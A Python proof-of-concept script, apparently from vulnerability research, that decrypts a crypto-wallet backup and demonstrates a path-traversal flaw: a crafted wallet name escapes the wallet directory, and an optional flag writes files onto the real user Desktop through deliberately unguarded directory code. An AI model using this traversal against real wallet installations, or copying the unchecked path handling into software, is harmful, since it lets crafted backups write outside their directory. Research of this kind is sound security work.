#!/usr/bin/env python3
"""Verify desktop backup: decrypt (password), extract, prove Desktop traversal, optionally write real Desktop txt."""
import argparse, hashlib, json, os, sqlite3, sys, tempfile, zipfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cake_backup_compat import decrypt_v2

def is_within(parent, cand):
    import os as _o
    p=_o.path.normcase(_o.path.normpath(_o.path.abspath(parent)))
    c=_o.path.normcase(_o.path.normpath(_o.path.abspath(cand)))
    try: return _o.path.commonpath([p,c])==p
    except ValueError: return False

def vulnerable_dir(type_root, name):
    # Dart: Directory('${typeRoot}/$name').createSync(recursive:true) resolves .. to target
    target = os.path.normpath(os.path.join(type_root, name))
    os.makedirs(target, exist_ok=True)
    return target

def copy_wallet_files_to(type_root, from_name, to_name):
    # replica cw_core/pathForWallet.dart:41 _copyDirectory (basename copy)
    import pathlib
    src=os.path.normpath(os.path.join(type_root, from_name))
    dst=os.path.normpath(os.path.join(type_root, to_name))
    os.makedirs(dst, exist_ok=True)
    for e in os.listdir(src):
        s=os.path.join(src,e)
        if os.path.isfile(s):
            open(os.path.join(dst, os.path.basename(s)),"wb").write(open(s,"rb").read())
    return src, dst

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--v3", required=True)
    ap.add_argument("--password", default="poc1234")
    ap.add_argument("--keychain-salt", default="cafebabe0011223344556677")
    ap.add_argument("--write-desktop", action="store_true", help="write real Desktop working.txt")
    a=ap.parse_args()
    print(f"[*] opening {a.v3} with password '{a.password}'")
    with zipfile.ZipFile(a.v3) as z:
        print("[*] outer:", z.namelist())
        meta=json.loads(z.read("metadata.json"))
        data_bin=z.read("data.bin")
        off=0; plain_all=b""
        for i,ch in enumerate(meta["chunks"]):
            enc=data_bin[off:off+ch["length"]["encrypted"]]; off+=ch["length"]["encrypted"]
            assert hashlib.sha512(enc).hexdigest()==ch["sha512sum"]["encrypted"]
            pt=decrypt_v2(a.password, enc)
            assert hashlib.sha512(pt).hexdigest()==ch["sha512sum"]["plain"]
            plain_all+=pt
            print(f"  chunk {i} OK (password accepted)")
        assert hashlib.sha512(plain_all).hexdigest()==meta["sha512sum"]
        print("[*] data.bin password-decrypt OK")
        inner=plain_all
    tmp=tempfile.mkdtemp(prefix="cake-desktop-sim-")
    print(f"[*] extract to {tmp}")
    with tempfile.NamedTemporaryFile(delete=False, suffix=".zip") as tf:
        tf.write(inner); ip=tf.name
    def safe(b,n):
        if not n or os.path.isabs(n): return None
        r=os.path.normpath(os.path.abspath(b)); t=os.path.normpath(os.path.join(r,n))
        return t if is_within(r,t) else None
    with zipfile.ZipFile(ip) as z:
        for info in z.infolist():
            out=safe(tmp, info.filename)
            if out is None:
                print(f"  BLOCKED (good): {info.filename!r}"); continue
            if info.is_dir(): os.makedirs(out, exist_ok=True)
            else:
                os.makedirs(os.path.dirname(out) or tmp, exist_ok=True)
                open(out,"wb").write(z.read(info.filename))
                print(f"  restored: {info.filename}")
    con=sqlite3.connect(os.path.join(tmp,"cake.db")); con.row_factory=sqlite3.Row
    rows=[dict(r) for r in con.execute('SELECT name,"type" FROM WalletInfo')]
    print("[*] WalletInfo:", [(r["name"],r["type"]) for r in rows])
    prefs=json.load(open(os.path.join(tmp,"~_preferences_dump"),encoding="utf-8"))
    print("[*] prefs current:", prefs["current_wallet_name"])
    kd=json.loads(decrypt_v2(a.keychain_salt+a.password, open(os.path.join(tmp,"~_keychain_dump"),"rb").read()))
    print("[*] keychain wallets:", [w["name"] for w in kd["wallets"]])
    # simulate app sinks in sandbox
    sim=os.path.join(tmp,"_app_sim"); troot=os.path.join(sim,"wallets","monero")
    os.makedirs(troot, exist_ok=True)
    # seed fake legit wallet dir with working.txt from backup
    legit_src=os.path.join(tmp,"wallets","monero","legit-wallet")
    sim_legit=os.path.join(troot,"legit-wallet")
    import shutil; shutil.copytree(legit_src, sim_legit, dirs_exist_ok=True)
    print("[*] legit working.txt:", open(os.path.join(sim_legit,"working.txt")).read())
    for evil in [prefs["current_wallet_name"]]:
        d=vulnerable_dir(troot, evil)
        print(f"[*] pathForWalletDir('{evil[:60]}...') -> {os.path.realpath(d)}")
        print(f"    contained in monero root? {is_within(os.path.realpath(troot), os.path.realpath(d))}")
        _, dst = copy_wallet_files_to(troot, "legit-wallet", evil)
        w=os.path.join(os.path.realpath(dst),"working.txt")
        print(f"[*] copyWalletFilesTo legit -> evil carries working.txt -> {w} = {open(w).read()!r}")
        print("[+] VULNERABLE (sandbox): Desktop traversal + 'working' bytes carried")
    if a.write_desktop:
        for desk in [os.path.join(os.path.expanduser("~"),"Desktop"), r"C:\Users\Public\Desktop"]:
            try:
                os.makedirs(desk, exist_ok=True)
                # direct txt on Desktop saying working (user ask)
                p1=os.path.join(desk,"working.txt")
                open(p1,"w",newline="\n").write("working")
                print(f"[+] wrote {p1} = 'working'")
                # dir proof via real traversal from simulated type_root
                rel=os.path.relpath(desk, troot)
                d2=vulnerable_dir(troot, rel)
                open(os.path.join(os.path.realpath(d2),"working.txt"),"w",newline="\n").write("working")
                print(f"[*] traversal rel {rel!r} -> {os.path.realpath(d2)} (+working.txt)")
            except Exception as e:
                print(f"[!] {desk} failed: {e}")
    else:
        print("(sandbox only; re-run with --write-desktop to drop real Desktop working.txt)")
    return 0

if __name__=="__main__":
    sys.exit(main())
